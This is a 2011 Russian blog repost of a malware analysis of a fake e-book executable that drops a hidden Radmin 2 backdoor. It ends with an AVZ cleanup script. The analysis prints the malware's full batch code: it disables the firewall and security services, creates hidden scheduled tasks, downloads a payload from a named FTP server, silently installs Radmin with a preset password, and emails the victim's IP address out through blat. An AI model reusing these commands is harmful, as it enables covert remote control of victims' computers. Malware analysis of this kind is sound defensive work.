+++
title = "Вирусы (и антивирусы) / Анализ очередного варианта скрытого радмина"
date = 2011-07-08T23:23:00Z
updated = 2011-07-08T23:24:14Z
tags = ["batch", "trojan", "backdoor", "loader", "radmin"]
blogimport = true 
[author]
	name = "devi1"
	uri = "https://www.blogger.com/profile/05777499482649623616"
+++

<div>Из этой статьи можно почерпнуть некоторые знания по написанию батников.</div><div><br /></div><div><br /></div><a href="http://habrahabr.ru/blogs/virus/123752/">Вирусы (и антивирусы) / Анализ очередного варианта скрытого радмина</a>: "Сегодня на форуме в личку прошло сообщение с просьбой проверить файл. Я согласился, любопытно же. Немного опережу события и скажу, что это бэкдор созданный из радмина второй ветки и кое-что еще)<br /><br />Полученный файл: <b>kak_ponyat_muzhchin_bibl.ru.exe (md5:2138A224BDDD1A36329F398A37E10AB9)</b><br /><br /><i>Хэш суммы я буду указывать только для вредоносных файлов.</i><br /><br />В общем по описанию — это какая-то книга, почему в exe — непонятно, глядим далее.<br /><br />Воспользуемся PEiD:<br /><br /><img src="http://i25.fastpic.ru/big/2011/0708/54/ce2bdc25690524829972504177ebf554.jpeg" /><br /><br /><em>UPX 0.89.6 — 1.02 / 1.05 — 2.90 (Delphi) stub -&gt; Markus &amp; Laszlo [RAR SFX]</em><br /><div><i></i><br /><a name='more'></a><i><br /></i><br />Попробуем распаковать винраром, получим два файла:<br /><br /><div><br /></div><div><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;"><strong>filip_olegovich.exe</strong><br />и <strong>setup.exe (md5:C888FCE716D600EE53D467F7DF2B2475)</strong><br /><br /><img src="http://i26.fastpic.ru/big/2011/0708/f6/262434c71551f8f3a1d5ecac76f76ef6.jpeg" style="max-width: 100%; vertical-align: bottom;" /><br /><br />Оба упакованы в upx, после распаковки получим следующую картину:<br /><br /><img src="http://i25.fastpic.ru/big/2011/0708/c0/2405b38c08764eb27043e2a30a348fc0.jpeg" style="max-width: 100%; vertical-align: bottom;" /><br /><br /><strong>filip_olegovich.exe</strong> — собранный в exe pdf-файл, он нас более не интересует.<br /><strong>setup.exe (md5:732FCAA243C007DAA9354AEAF3F6D572)</strong> — компиллятор <strong>PureBasic 4.x -&gt; Neil Hodgson *</strong>, что свойственно для конвертора bat-файлов в исполняемые exe.<br /><br />Пока оба варианта подозрительного файла загружаются на вирустотал, поглядим ресурсы распакованного<strong>setup.exe</strong>:<br /><br /><img src="http://i25.fastpic.ru/big/2011/0708/eb/110a4ee1b358a9452b81e802119ce1eb.jpeg" style="max-width: 100%; vertical-align: bottom;" /><br /><br />Да, это конвертированный батник, который создаст 2 файла и выполнит собственный бат код:<br /></span><br /><blockquote style="border-left-color: rgb(187, 187, 187); border-left-style: solid; border-left-width: 2px; clear: both; margin-bottom: 0.83em; margin-left: 0px; margin-right: 0px; margin-top: 0.83em; padding-bottom: 0px; padding-left: 15px; padding-right: 0px; padding-top: 0px;"><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;">sc config schedule start= auto</span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;">sc start schedule</span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;"><br /></span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;">sc config wscsvc start= disabled</span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;">sc config SharedAccess start= disabled</span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;"><br /></span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;">sc stop wscsvc</span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;">sc stop SharedAccess</span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;"><br /></span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;">schtasks /create /tn «f» /sc minute /mo 1 /ru «NT AUTHORITY\SYSTEM» /tr %systemroot%/ff.bat</span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;"><br /></span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;">attrib +h %systemroot%/tasks/*.* netsh advfirewall set currentprofile state off</span><br /><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;">C:/isendsms_setup.exe</span></blockquote><span class="Apple-style-span" style="font-family: Verdana, sans-serif; font-size: 13px; line-height: 20px;"><br />Этот батник запустит службу планировщика задач, остановит службы «центр обеспечения безопасности и оповещения системы безопасности» и «брэндмауэр windows» Далее добавит задание в планировщик, которое будет запускать файл <strong>ff.bat</strong> каждую минуту, скроет файл задания и снова отключит фаерволл. Разработчик или параноик или диллетант, скорее — второе. Проще говоря, этот файл <strong>setup.exe</strong> — экземпляр трояна- загрузчика (trojan-downloader), просто несколько импровезированный. Далее рассмотрим два указанных выше файла: Этот текст будет скопирован в <strong>%systemroot%/system.bin</strong><br /><blockquote style="border-left-color: rgb(187, 187, 187); border-left-style: solid; border-left-width: 2px; clear: both; margin-bottom: 0.83em; margin-left: 0px; margin-right: 0px; margin-top: 0.83em; padding-bottom: 0px; padding-left: 15px; padding-right: 0px; padding-top: 0px;">u11631<br />javasc<br />get f.bat<br />del check.txt<br />bye</blockquote><br />А такой код в %systemroot%/ff.bat<br /><blockquote style="border-left-color: rgb(187, 187, 187); border-left-style: solid; border-left-width: 2px; clear: both; margin-bottom: 0.83em; margin-left: 0px; margin-right: 0px; margin-top: 0.83em; padding-bottom: 0px; padding-left: 15px; padding-right: 0px; padding-top: 0px;">sc config wscsvc start= disabled<br />sc config SharedAccess start= disabled<br />sc stop wscsvc sc stop SharedAccess<br />ftp -s:C:\WINDOWS/system.bin ftp.on.ufanet.ru f.bat</blockquote><br /><em>%systemroot% — папка windows, в моем случае C:\windows</em><br /><br />О чем это может нам сказать?<br />Прежде всего, файл <strong>system.bin</strong> — конфиг для фтп-клиента, который зайдет на сервер и скачает определенный файл. (Строки по очереди: логин от сервера, пароль, скачивание файла с сервера, удаление файла на сервере, завершение ftp-сессии)<br />Что делает файл <strong>ff.bat</strong>? Во первых останавливает и убирает из автозагрузки две службы: <strong>wscsvc </strong>— центр обеспечения безопасности и оповещения системы безопасности<br /><strong>SharedAccess </strong>— брэндмауэр windows Это не позволяет встроенному фаерволлу заблокировать дальнейшую сетевую активность, а так же блокирует оповещения о брешах в безопасности системы.<br />Далее поднимает подключение к фтп серверу <strong>ftp.on.ufanet.ru</strong> с настойками из файла <strong>system.bin</strong>. После завершения сессии фтп — выполнит файл <strong>f.ftp</strong>, который скачает с указанного сервера.<br />Наши файлы <strong>setup.exe</strong>, кстати, уже проанализировались на virustotal:<br /><ul style="list-style-image: initial; list-style-position: initial; list-style-type: disc; margin-bottom: 1.5em; margin-left: 2.65em; margin-right: 1em; margin-top: 1.5em; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; padding-top: 0px;"><li style="margin-bottom: 0px; margin-left: 0px; margin-right: 0px; margin-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; padding-top: 0px;"><a href="http://www.virustotal.com/file-scan/report.html?id=8fec6bfee0fcbd2e32810dc905a30e2206da35cea08ffa478bcdd8d02e854112-1310126086" style="color: #6da3bd;">Запакованный</a></li><li style="margin-bottom: 0px; margin-left: 0px; margin-right: 0px; margin-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; padding-top: 0px;"><a href="http://www.virustotal.com/file-scan/report.html?id=0836ab93db5c278225a93d2108b8c7d2565cdd6a74ff311b823b8a77666174dc-1310126562" style="color: #6da3bd;">Распакованный</a></li></ul><br />Дальше нам нужно получить файлы, которые должны были скачаться с фтп, для этого возьмем логин и пароль и подключимся самостоятельно:<br /><strong>f.bat</strong><br /><strong>system.exe (md5:1ADEF54E08294BC7548C91C8F6CF2032)</strong> — RAR SFX архив с таким вот комментарием:<br /><pre style="font-size: 1em; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; margin-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; padding-top: 0px; white-space: pre-wrap;">path=%SYSTEMROOT%/help/win32 silent=1 overwrite=1 setup=install.bat</pre><br />Этот параметр разархивирует в тихом режиме содержимое архива в <strong>%SYSTEMROOT%/help/win32</strong><br /><br /><img src="http://i24.fastpic.ru/big/2011/0708/4c/361bfaacf49802287308c926e323a64c.jpeg" style="max-width: 100%; vertical-align: bottom;" /><br /><br />После распаковывания тем же самым раром получаем ни что иное, как сборку скрытого радмина второй версии: <img src="http://i26.fastpic.ru/big/2011/0708/08/62d95977fc1ebd06175ee4e7909dbb08.jpeg" style="max-width: 100%; vertical-align: bottom;" /> <strong>raddrv.dll</strong> и <strong>AdmDll.dll</strong> — драйвера Radmin 2<br /><br /><strong>svchost.exe</strong> — исполняемый файл Radmin 2<br /><br /><strong>Blat.*</strong> — файлы, пренадлежащие консольному почтовому клиенту blat<br /><br />А вот эти файлы рассмотрим поподробней: <strong>install.bat</strong><br /><blockquote style="border-left-color: rgb(187, 187, 187); border-left-style: solid; border-left-width: 2px; clear: both; margin-bottom: 0.83em; margin-left: 0px; margin-right: 0px; margin-top: 0.83em; padding-bottom: 0px; padding-left: 15px; padding-right: 0px; padding-top: 0px;">@echo off<br /><br />sc config wscsvc start= disabled<br />sc stop wscsvc<br /><br />sc config SharedAccess start= disabled<br />sc stop SharedAccess<br /><br />sc config schedule start= auto<br />sc start schedule<br />svchost.exe /install /silence<br />svchost.exe /pass:12345678125 /save /silence<br />REG ADD HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters /v DisableTrayIcon /t REG_BINARY /d 00000001 /f<br />REG ADD HKLM\SYSTEM\CurrentControlSet\Services\r_server /v DisplayName /t REG_SZ /d «Service Host Controller» /f<br />svchost.exe /stop<br />svchost.exe /start<br />blat.exe -install -server smtp.yandex.ru -port 587 -f ufanetcom2@yandex.ru -u ufanetcom2 -pw javascriptsc<br />schtasks /create /tn «security» /sc minute /mo 15 /ru «NT AUTHORITY\SYSTEM» /tr %SYSTEMROOT%/help/win32/microsoft.bat<br />attrib +h %systemroot%/tasks/*.*<br />exit</blockquote><br />Разберем комманды по порядку. Прежде всего очередное отключение брэндмауэра и оповещений безопасности, затем повторный запуск службы планировщика задач. Далее — самое вкусное, запуск серверной части Radmin с параметрами, включающими тихую установку, предустановленный пароль а так же запись в реестр параметров сокрытия значка в трее жертвы. Второй ключ задаст имя службы радмина — <strong>Service Host Controller</strong><br /><br />Ну и окончание — запуск самой службы. Таким образом на скомпрометированной системе установлен Radmin с предустановленным паролем и все возможным сокрытием. Далее мы видим запись в реестр данных для отправки почты с помощью почтового клиента <strong>blat </strong>и добавление всего этого бат-файла в автозагрузку через планировщик заданий. <strong>microsoft.bat</strong><br /><blockquote style="border-left-color: rgb(187, 187, 187); border-left-style: solid; border-left-width: 2px; clear: both; margin-bottom: 0.83em; margin-left: 0px; margin-right: 0px; margin-top: 0.83em; padding-bottom: 0px; padding-left: 15px; padding-right: 0px; padding-top: 0px;">sc config SharedAccess start= disabled<br />sc stop SharedAccess<br />ipconfig /all&gt;%SYSTEMROOT%\Help\win32/ip.txt<br />%SYSTEMROOT%/help/win32/blat.exe %systemroot%/help/win32/ip.txt -to ufanetcom2@yandex.ru. exit</blockquote><br />Второй батник уже в который раз отключает системный фаерволл, а так же выполняет команду ipconfig /all с сохранением вывода в текстовый файл, который в дальнейшем отправится с помощью blat по адресу ufanetcom2@yandex.ru, короче говоря — отправит ip-адрес для подключения злоумышленника к инфицированной машине.<br /><br />На этом, в общем-то, все, анализ закончен. Анализ совершенно статичен, запускать в виртуальной среде ничего не пришлось, все банально. Но тем не менее, зайдя на почту я видел большое количество писем с ip-адресами жертв. Ниже будет приведен скрипт AVZ для лечения системы.<br /><pre style="font-size: 1em; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; margin-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; padding-top: 0px; white-space: pre-wrap;">begin SearchRootkit(true, true); SetAVZGuardStatus(True); StopService('r_server'); DeleteService('r_server', true ); TerminateProcessByName('c:\windows\help\win32\svchost.exe'); DeleteFile('C:\WINDOWS\ff.bat'); DeleteFile('C:\WINDOWS\SYSTEM.DLL'); DeleteFileMask('C:\WINDOWS\help\win32', '*.*', true); BC_ImportAll; ExecuteSysClean; ExecuteWizard('TSW',2,3,true); BC_Activate; RebootWindows(true); end.</pre></span></div></div>
